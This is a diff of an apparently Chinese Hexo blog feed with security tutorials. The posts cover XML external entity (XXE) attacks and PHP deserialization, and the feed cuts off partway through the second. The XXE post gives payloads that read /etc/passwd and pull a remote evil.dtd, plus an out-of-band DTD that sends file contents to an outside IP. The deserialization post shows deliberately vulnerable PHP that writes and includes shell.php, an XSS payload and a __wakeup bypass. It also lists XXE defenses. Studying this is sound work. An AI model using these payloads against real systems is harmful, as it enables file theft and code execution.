-<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>phar的知识现在已经有很多了，也很值得去深挖，自己还只是会了一点表面，需要更加深入的研究。    </p>
+<p>可是我的xss平台总是拿不到cookie，换了很多个平台也没用，如下图：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/jiulin23/image@2.4.0/wp/hgame2021wp/8.png"></p>
+<p>到现在也不知道为什么。。。</p>
 ]]></content>
       <categories>
-        <category>php</category>
+        <category>WP</category>
       </categories>
   </entry>
   <entry>
@@ -440,6 +619,473 @@
 </blockquote>
 <h2 id="ftp"><a href="#ftp" class="headerlink" title="ftp://"></a>ftp://</h2><p>一种提供网络之间共享文件的协议，可以在计算机之间可靠、高效地传送文件。FTP协议包括两个组成部分，其一为FTP服务器，其二为FTP客户端。其中FTP服务器用来存储文件，用户可以使用FTP客户端通过FTP协议访问位于FTP服务器上的资源。在开发网站的时候，通常利用FTP协议把网页或程序传到Web服务器上。</p>
 <p>我们见到的大量CMS系统，也都是通过ftp来进行文件传输的。</p>
+]]></content>
+      <categories>
+        <category>php</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>XXE漏洞总结</title>
+    <url>/2021/01/23/xxe/</url>
+    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>本文主要总结XML外部实体注入漏洞。文中部分内容直接或间接引用于其他大牛的文章中，我都会标明出处，如有侵权，请发邮箱联系我删除。多有不合理之处，望大佬指点。</p>
+<hr>
+<h1 id="XML基础知识"><a href="#XML基础知识" class="headerlink" title="XML基础知识"></a>XML基础知识</h1><p>要想了解XXE漏洞，首先得懂得基础知识，了解XML文档的基本知识。</p>
+<h2 id="XML概述"><a href="#XML概述" class="headerlink" title="XML概述"></a>XML概述</h2><p>XML是一种用于标记电子文件使其具有结构性的标记语言，可以用来标记数据、定义数据类型，是一种允许用户对自己的标记语言进行定义的源语言。其类似于HTML，但HTML 旨在显示信息，而 XML 旨在传输信息。<a id="more"></a></p>
+<h2 id="XML结构"><a href="#XML结构" class="headerlink" title="XML结构"></a>XML结构</h2><p>XML文档结构包括XML声明、DTD文档类型定义（可选）、文档元素。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/jiulin23/image@2.3.0/xxe/1.png"></p>
+<h2 id="XML文档的构建模块"><a href="#XML文档的构建模块" class="headerlink" title="XML文档的构建模块"></a>XML文档的构建模块</h2><p>所有的 XML 文档（以及 HTML 文档）均由以下简单的构建模块构成：</p>
+<ul>
+<li>元素</li>
+<li>属性</li>
+<li>实体</li>
+<li>PCDATA</li>
+<li>CDATA</li>
+</ul>
+<p>下面是每个构建模块的简要描述。</p>
+<h3 id="元素"><a href="#元素" class="headerlink" title="元素"></a>元素</h3><p>XML元素是XML以及HTML文档的主要构建模块，指的是从（且包括）开始标签直到（且包括）结束标签的部分。元素可包含文本、其他元素或者是空的。</p>
+<p>实例:</p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span>body text in between<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">message</span>&gt;</span>some message in between<span class="tag">&lt;/<span class="name">message</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="属性"><a href="#属性" class="headerlink" title="属性"></a>属性</h3><p>属性可提供有关元素的额外信息。属性不能包含多个值，且不能包含树结构。</p>
+<p>实例：</p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">file</span> <span class="attr">type</span>=<span class="string">&quot;gif&quot;</span>&gt;</span>computer.gif<span class="tag">&lt;/<span class="name">file</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="实体"><a href="#实体" class="headerlink" title="实体"></a>实体</h3><p>实体是用于定义引用普通文本或特殊字符的快捷方式的变量。</p>
+<p>实体引用是对实体的引用。</p>
+<p>实体可在内部或外部进行声明。</p>
+<h3 id="PCDATA"><a href="#PCDATA" class="headerlink" title="PCDATA"></a>PCDATA</h3><p>PCDATA 的意思是被解析的字符数据(parsed character data)。<br>PCDATA 是会被解析器解析的文本。这些文本将被解析器检查实体以及标记。</p>
+<h3 id="CDATA"><a href="#CDATA" class="headerlink" title="CDATA"></a>CDATA</h3><p>CDATA 的意思是字符数据(character data)。<br>CDATA 是不会被解析器解析的文本。</p>
+<h2 id="DTD-文档类型定义"><a href="#DTD-文档类型定义" class="headerlink" title="DTD(文档类型定义)"></a>DTD(文档类型定义)</h2><p>DTD（文档类型定义）的作用是定义 XML 文档的合法构建模块。</p>
+<p>DTD 既可以在 XML 文档内声明，也可以外部引用。</p>
+<ol>
+<li><p>内部声明的语法：&lt;!DOCTYPE 根元素 [元素声明]&gt; 。例如：</p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">note</span> [</span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ELEMENT <span class="meta-keyword">note</span> (<span class="meta-keyword">to</span>,<span class="meta-keyword">from</span>,<span class="meta-keyword">heading</span>,<span class="meta-keyword">body</span>)&gt;</span></span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ELEMENT <span class="meta-keyword">to</span>      (<span class="meta-keyword">#PCDATA</span>)&gt;</span></span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ELEMENT <span class="meta-keyword">from</span>    (<span class="meta-keyword">#PCDATA</span>)&gt;</span></span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ELEMENT <span class="meta-keyword">heading</span> (<span class="meta-keyword">#PCDATA</span>)&gt;</span></span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ELEMENT <span class="meta-keyword">body</span>    (<span class="meta-keyword">#PCDATA</span>)&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">to</span>&gt;</span>George<span class="tag">&lt;/<span class="name">to</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">from</span>&gt;</span>John<span class="tag">&lt;/<span class="name">from</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">heading</span>&gt;</span>Reminder<span class="tag">&lt;/<span class="name">heading</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span>Don&#x27;t forget the meeting!<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>外部声明(引用外部DTD)：&lt;!DOCTYPE 根元素 SYSTEM “文件名”&gt;。如：</p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">note</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;note.dtd&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">to</span>&gt;</span>George<span class="tag">&lt;/<span class="name">to</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">from</span>&gt;</span>John<span class="tag">&lt;/<span class="name">from</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">heading</span>&gt;</span>Reminder<span class="tag">&lt;/<span class="name">heading</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span>Don&#x27;t forget the meeting!<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span> </span><br></pre></td></tr></table></figure>
+
+
+
+</li>
+</ol>
+   <figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- note.dtd内容 --&gt;</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">note</span> (<span class="meta-keyword">to</span>,<span class="meta-keyword">from</span>,<span class="meta-keyword">heading</span>,<span class="meta-keyword">body</span>)&gt;</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">to</span> (<span class="meta-keyword">#PCDATA</span>)&gt;</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">from</span> (<span class="meta-keyword">#PCDATA</span>)&gt;</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">heading</span> (<span class="meta-keyword">#PCDATA</span>)&gt;</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">body</span> (<span class="meta-keyword">#PCDATA</span>)&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h2 id="DTD实体"><a href="#DTD实体" class="headerlink" title="DTD实体"></a>DTD实体</h2><p>DTD实体是用于定义引用普通文本或特殊字符的快捷方式的变量，可以内部声明或外部引用。</p>
+<p>实体又分为一般实体和参数实体。</p>
+<ul>
+<li><p>一般实体的声明语法：<code>&lt;!ENTITY 实体名 &quot;实体内容&quot;&gt;</code></p>
+<p>引用实体的方式：<code>&amp;实体名;</code>（一个和号 (&amp;)、一个实体名称、以及一个分号 (;)）</p>
+</li>
+<li><p>参数实体只能在DTD中使用，参数实体的声明格式： <code>&lt;!ENTITY % 实体名 &quot;实体内容&quot;&gt;</code></p>
+<p>引用实体的方式：<code>%实体名;</code></p>
+</li>
+</ul>
+<ol>
+<li><p>内部实体声明：&lt;!ENTITY 实体名称 “实体的值”&gt; 。例如：</p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">test</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="meta-keyword">writer</span> <span class="meta-string">&quot;Bill Gates&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="meta-keyword">copyright</span> <span class="meta-string">&quot;Copyright W3School.com.cn&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">test</span>&gt;</span><span class="symbol">&amp;writer;</span><span class="symbol">&amp;copyright;</span><span class="tag">&lt;/<span class="name">test</span>&gt;</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>外部实体声明：&lt;!ENTITY 实体名称 SYSTEM “URI”&gt;。例如：</p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">test</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="meta-keyword">writer</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;http://www.w3school.com.cn/dtd/entities.dtd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="meta-keyword">copyright</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;http://www.w3school.com.cn/dtd/entities.dtd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">author</span>&gt;</span><span class="symbol">&amp;writer;</span><span class="symbol">&amp;copyright;</span><span class="tag">&lt;/<span class="name">author</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+
+
+
+</li>
+</ol>
+<hr>
+<h1 id="XXE攻击方式"><a href="#XXE攻击方式" class="headerlink" title="XXE攻击方式"></a>XXE攻击方式</h1><p>当应用是通过用户上传的XML文件或POST请求进行数据的传输，并且应用没有禁止XML引用外部实体，也没有过滤用户提交的XML数</p>
+<p>据，那么就会产生XML外部实体注入漏洞。</p>
+<p>引入外部实体方式有多种，比如：</p>
+<ol>
+<li><p><strong>直接通过DTD外部实体声明</strong></p>
+<p>XML内容：</p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE a [</span></span><br><span class="line"><span class="meta">	<span class="meta">&lt;!ENTITY b <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///etc/passwd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">c</span>&gt;</span><span class="symbol">&amp;b;</span><span class="tag">&lt;/<span class="name">c</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>如果以上xml代码被解析，则会返回/etc/passwd文件的内容。</p>
+</li>
+</ol>
+<ol start="2">
+<li><p><strong>通过DTD文档引入外部DTD文档，再引入外部实体声明</strong></p>
+<p>XML内容：</p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE a <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;http:/mark4z5.com/evil.dtd&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">c</span>&gt;</span><span class="symbol">&amp;b;</span><span class="tag">&lt;/<span class="name">c</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>DTD文件内容：</p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY b <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///etc/passwd&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+
+</li>
+</ol>
+<ol start="3">
+<li><p><strong>通过DTD外部实体声明引入外部实体声明</strong></p>
+<p>意思就是先写一个外部实体声明，然后引用的是在攻击者服务器上面的外部实体声明。如下XML内容：</p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE a [<span class="meta">&lt;!ENTITY % d <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;http:/mark4z5.com/evil.dtd&quot;</span> &gt;</span></span></span><br><span class="line"><span class="meta">%d;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">c</span>&gt;</span><span class="symbol">&amp;b;</span><span class="tag">&lt;/<span class="name">c</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>dtd文件内容：</p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY b <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///etc/passwd&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+
+</li>
+</ol>
+<p>   要注意的是，在上面的例子中，例1和例2实体名前面并没有<code>%</code>，而例3中的实体名前是有<code>%</code>的，这里的区别在于，例1中定义的实体是通用实体，而例2中定义的是参数实体，并且参数实体只能在DTD中使用，即例2代码中的第三行 <code>%d;</code>，这里就像在外面引用统用实体一样，这里的%d;就引用了<code>http:/mark4z5.com/evil.dtd</code>这个文件到DTD中。</p>
+<p>不同程序支持的协议不同，如下：</p>
+<table>
+<thead>
+<tr>
+<th align="left">LIBXML2</th>
+<th align="left">PHP</th>
+<th align="left">JAVA</th>
+<th align="left">.NET</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">file</td>
+<td align="left">file</td>
+<td align="left">http</td>
+<td align="left">file</td>
+</tr>
+<tr>
+<td align="left">http</td>
+<td align="left">http</td>
+<td align="left">https</td>
+<td align="left">http</td>
+</tr>
+<tr>
+<td align="left">ftp</td>
+<td align="left">ftp</td>
+<td align="left">ftp</td>
+<td align="left">https</td>
+</tr>
+<tr>
+<td align="left"></td>
+<td align="left">php</td>
+<td align="left">file</td>
+<td align="left">ftp</td>
+</tr>
+<tr>
+<td align="left"></td>
+<td align="left">compress.zlib</td>
+<td align="left">jar</td>
+<td align="left"></td>
+</tr>
+<tr>
+<td align="left"></td>
+<td align="left">compress.bzip2</td>
+<td align="left">netdoc</td>
+<td align="left"></td>
+</tr>
+<tr>
+<td align="left"></td>
+<td align="left">data</td>
+<td align="left">mailto</td>
+<td align="left"></td>
+</tr>
+<tr>
+<td align="left"></td>
+<td align="left">glob</td>
+<td align="left">gopher</td>
+<td align="left"></td>
+</tr>
+<tr>
+<td align="left"></td>
+<td align="left">phar</td>
+<td align="left"></td>
+<td align="left"></td>
+</tr>
+</tbody></table>
+<p>其中php支持的协议会更多一些，但需要一定的扩展支持。</p>
+<hr>
+<h1 id="XXE实例"><a href="#XXE实例" class="headerlink" title="XXE实例"></a>XXE实例</h1><p>XXE可导致读取任意文件、执行系统命令、探测内网端口、攻击内网网站等危害。</p>
+<p><strong>实例一：读取任意文件</strong></p>
+<p><img src="https://cdn.jsdelivr.net/gh/jiulin23/image@2.3.0/xxe/2.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/jiulin23/image@2.3.0/xxe/3.png"></p>
+<p>这里是读取/etc/passwd，有些XML解析库支持列目录，攻击者通过列目录、读文件，获取帐号密码后进一步攻击，如读取tomcat-users.xml得到帐号密码后登录tomcat的manager部署webshell。</p>
+<p>另外，当数据不回显的时候，可以把数据发送到远程服务器，在触发XXE攻击之后，服务器会把文件内容发送到攻击者网站。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/jiulin23/image@2.3.0/xxe/4.png"></p>
+<p>远程DTD文件内容如下：</p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">all</span></span></span><br><span class="line"><span class="meta"><span class="meta-string">&quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#x27;http://192.168.1.122/?%file;&#x27;&gt;&quot;</span></span></span><br><span class="line"><span class="meta">&gt;</span></span><br><span class="line">%all;</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="https://cdn.jsdelivr.net/gh/jiulin23/image@2.3.0/xxe/5.png"></p>
+<p><strong>实例二：执行系统命令</strong></p>
+<p><img src="https://cdn.jsdelivr.net/gh/jiulin23/image@2.3.0/xxe/6.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/jiulin23/image@2.3.0/xxe/7.png"></p>
+<p>这里是在安装expect扩展的PHP环境里执行系统命令，其他协议也有可能可以执行系统命令。</p>
+<p><strong>实例三：探测内网端口</strong></p>
+<p><img src="https://cdn.jsdelivr.net/gh/jiulin23/image@2.3.0/xxe/8.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/jiulin23/image@2.3.0/xxe/9.png"></p>
+<p>通过这里探测192.168.1.1的80、81端口，通过返回的“Connection refused”可以知道该81端口是closed的，而80端口是open的。</p>
+<p><strong>实例四：攻击内网网站</strong></p>
+<p><img src="https://cdn.jsdelivr.net/gh/jiulin23/image@2.3.0/xxe/10.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/jiulin23/image@2.3.0/xxe/11.png"></p>
+<p>该例子是攻击内网struts2网站，远程执行了系统命令。</p>
+<hr>
+<h1 id="防御XXE攻击"><a href="#防御XXE攻击" class="headerlink" title="防御XXE攻击"></a>防御XXE攻击</h1><p>对于这种危害很大的漏洞，我们要进行防御。</p>
+<p>防御方法：</p>
+<ol>
+<li><p>使用开发语言提供的方法禁用外部实体</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">PHP：</span><br><span class="line">libxml_disable_entity_loader(true);</span><br><span class="line"></span><br><span class="line">JAVA:</span><br><span class="line">DocumentBuilderFactory dbf &#x3D;DocumentBuilderFactory.newInstance();</span><br><span class="line">dbf.setExpandEntityReferences(false);</span><br><span class="line"></span><br><span class="line">Python：</span><br><span class="line">from lxml import etree</span><br><span class="line">xmlData &#x3D; etree.parse(xmlSource,etree.XMLParser(resolve_entities&#x3D;False))</span><br></pre></td></tr></table></figure>
+
+
+
+</li>
+</ol>
+<ol start="2">
+<li><p>过滤和验证用户提交的XML数据</p>
+<p>一般过滤的关键词：<code>&lt;!DOCTYPE</code>和<code>&lt;!ENTITY</code>，或者<code>SYSTEM</code>和<code>PUBLIC</code>。</p>
+</li>
+</ol>
+<ol start="3">
+<li>不允许XML中含有任何自己声明的DTD</li>
+</ol>
+]]></content>
+      <categories>
+        <category>XXE</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>PHP反序列化漏洞总结</title>
+    <url>/2020/12/26/php1/</url>
+    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>​    本文主要总结php反序列化漏洞。为了总结全面一点，文中部分内容直接或间接引用于其他大牛的文章中，我都会标明出处，如有侵权，请发邮箱联系我删除。多有不合理之处，望大佬指点。</p>
+<hr>
+<h1 id="反序列化原理"><a href="#反序列化原理" class="headerlink" title="反序列化原理"></a>反序列化原理</h1><p>PHP序列化和反序列化主要是通过<code>serialize</code>  、<code>unserialize</code> 两个函数来分别实现，序列化就是将对象转换为可保存或传输的字符串的格式，反序列化就是把字符串格式恢复回原本的对象。在PHP中，序列化和反序列化一般用做缓存，比如session缓存，cookie等。<a id="more"></a></p>
+<p>以下是一个php序列化的实例：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class DemoClass    	&#x2F;&#x2F;定义一个DemoClass类</span><br><span class="line">&#123;</span><br><span class="line">public $name  &#x3D; &#39;DemoClass&#39;;   &#x2F;&#x2F;定义一个name变量</span><br><span class="line">public $sex &#x3D; &quot;man&quot;;	&#x2F;&#x2F;定义一个sex变量</span><br><span class="line">public $age &#x3D; &quot;7&quot;; &#x2F;&#x2F;定义一个age变量</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$example &#x3D; new DemoClass();   &#x2F;&#x2F;创建一个对象</span><br><span class="line">$example-&gt;name &#x3D;&quot;John&quot;;</span><br><span class="line">$example-&gt;sex &#x3D; &quot;Woman&quot;;</span><br><span class="line">$example-&gt;age &#x3D; &quot;18&quot;  &#x2F;&#x2F;修改其中属性的值</span><br><span class="line"></span><br><span class="line">echo serialize($example)   &#x2F;&#x2F;返回序列化的结果</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>运行结果如下：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/jiulin23/image@2.2.1/php1/1.png"></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;序列化第一位的含义：</span><br><span class="line">String</span><br><span class="line">  s:size:value;</span><br><span class="line">Integer</span><br><span class="line">  i:value;</span><br><span class="line">Boolean</span><br><span class="line">  b:value; (does not store &quot;true&quot; or &quot;false&quot;, does store &#39;1&#39; or &#39;0&#39;)</span><br><span class="line">Null</span><br><span class="line">  N;</span><br><span class="line">Array</span><br><span class="line">  a:size:&#123;key definition;value definition;(repeated per element)&#125;</span><br><span class="line">Object</span><br><span class="line">  O:strlen(object name):object name:object size:&#123;s:strlen(property name):property name:property definition;(repeated per property)&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<hr>
+<h1 id="反序列化漏洞"><a href="#反序列化漏洞" class="headerlink" title="反序列化漏洞"></a>反序列化漏洞</h1><h2 id="魔术方法"><a href="#魔术方法" class="headerlink" title="魔术方法"></a>魔术方法</h2><p>在php中，有一种叫做”魔术方法“的东西，我们在序列化和反序列化的过程中，可能会使用到其中的部分“魔法函数”，而这些函数在执行时就有可能为我们所利用。</p>
+<p>下面是比较典型的PHP反序列化漏洞中可能会用到的魔法函数：</p>
+<blockquote>
+<p> <strong>__wakeup</strong></p>
+<p> <code>unserialize</code>会检查是否存在一个_<code>wakeup</code>( ) 方法。如果存在，则会先调用_wakeup 方法，预先准备对象需要的资源。</p>
+<p> <strong>__construct</strong> </p>
+<p> 具有构造函数的类会在每次创建新对象时先调用此方法。</p>
+<p> <strong>__destruct</strong></p>
+<p> 析构函数会在到某个对象的所有引用都被删除或者当对象被显式销毁时执行。</p>
+<p> <strong>__toString</strong> </p>
+<p> 用于一个类被当成字符串时使用。此方法必须返回一个字符串，否则将发出一条 E_RECOVERABLE_ERROR 级别的致命错误。</p>
+<p> <strong>__sleep</strong> </p>
+<p> 在对象在被序列化之前运行。</p>
+<p> <strong>__call</strong></p>
+<p> 在对象上下文中调用不可访问的方法时触发。</p>
+</blockquote>
+<h2 id="最简单的反序列化"><a href="#最简单的反序列化" class="headerlink" title="最简单的反序列化"></a>最简单的反序列化</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> $test = <span class="string">&quot;demo&quot;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;test;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a = $_GET[<span class="string">&#x27;test&#x27;</span>];</span><br><span class="line">$a_unser = unserialize($a);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>构造：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">test=O:<span class="number">1</span>:<span class="string">&quot;A&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;test&quot;</span>;s:<span class="number">28</span>:<span class="string">&quot;&lt;img src=1 onerror=alert(1)&gt;&quot;</span>;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这样就利用<code>__destruct()</code>造成了XSS。当然结合实际环境可以造成更大的危害。</p>
+<h2 id="利用方法"><a href="#利用方法" class="headerlink" title="利用方法"></a>利用方法</h2><ul>
+<li><p><strong>__wake up</strong>的绕过</p>
+<p><code>_wakeup</code>在<code>unserialize()</code>时自动调用，当序列化字符串表示对象属性个数的值大于真实个数的属性时，会跳过对<code>__wakeup</code>的执行。</p>
+<p>例如下面这道题：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/jiulin23/image@2.2.1/php1/2.png"></p>
+<p>由代码可以看出，flag在<code>flag1.php</code>里，下面的<code>if else</code>里如果没有参数tryhackme就会打印本页源码，有的话则打印指定文件内容，    所以我们要利用<code>_wakeup()</code>绕过把file改成<code>flag1.php</code>。百度得知绕过的方法：</p>
+<blockquote>
+<p>_wakeup()函数漏洞原理：当序列化字符串表示对象属性个数的值大于真实个数的属性时就会跳过__wakeup的执行。</p>
+</blockquote>
+<p>​    所以我们这么写：</p>
+<blockquote>
+<p>O:5:”SoFun”:2:{}</p>
+</blockquote>
+<p>只有一个对象，但是依然写2，就可以绕过了。</p>
+</li>
+</ul>
+<ul>
+<li><p><strong>__wakeup() 或__destruct()的利用</strong></p>
+<p>在<code>unserialize()</code>中会直接调用<code>wakeup()</code> 或<code>destruct()</code>，中间无需其他过程。因此最理想的情况就是一些漏洞/危害代码直接在<code>wakeup()</code>或<code>destruct()</code>中，从而当我们控制序列化字符串时就可以去直接触发它们。</p>
+<p>假设index源码如下：</p>
+</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">a</span></span>&#123;</span><br><span class="line">	<span class="keyword">var</span> $test = <span class="string">&#x27;123&#x27;</span>;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		$fp=fopen(<span class="string">&quot;shell.php&quot;</span>,<span class="string">&quot;w&quot;</span>);</span><br><span class="line">		fwrite($fp,<span class="keyword">$this</span>-&gt;test);</span><br><span class="line">		fclose($fp);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">$class=$_GET[<span class="string">&#x27;test&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> $class;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">$class_unser=unserialize($class);</span><br><span class="line"><span class="keyword">require</span> <span class="string">&quot;shell.php&quot;</span>;        <span class="comment">//包含shell.php文件</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>​    基本的思路是，通过 <code>serialize()</code> 得到我们要的序列化字符串，之后再传进去。通过源代码知，把对象中的test值赋为 “<?php phpinfo();?>“,再调用<code>unserialize()</code>时会通过<code>__wakeup()</code>把test的写入到<code>shell.php</code>中。为此我们写个php脚本：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class a&#123;</span><br><span class="line">	var $test &#x3D; &#39;123&#39;;</span><br><span class="line">	function __wakeup()&#123;</span><br><span class="line">		$fp&#x3D;fopen(&quot;shell.php&quot;,&quot;w&quot;);</span><br><span class="line">		fwrite($fp,$this-&gt;test);</span><br><span class="line">		fclose($fp);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">$class2&#x3D;new a();</span><br><span class="line">$class2-&gt;test&#x3D;&quot;&lt;?php phpinfo();?&gt;&quot;;</span><br><span class="line">$class2_ser&#x3D;serialize($class2);</span><br><span class="line">echo $class2_ser;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>结果如下：</p>
+<blockquote>
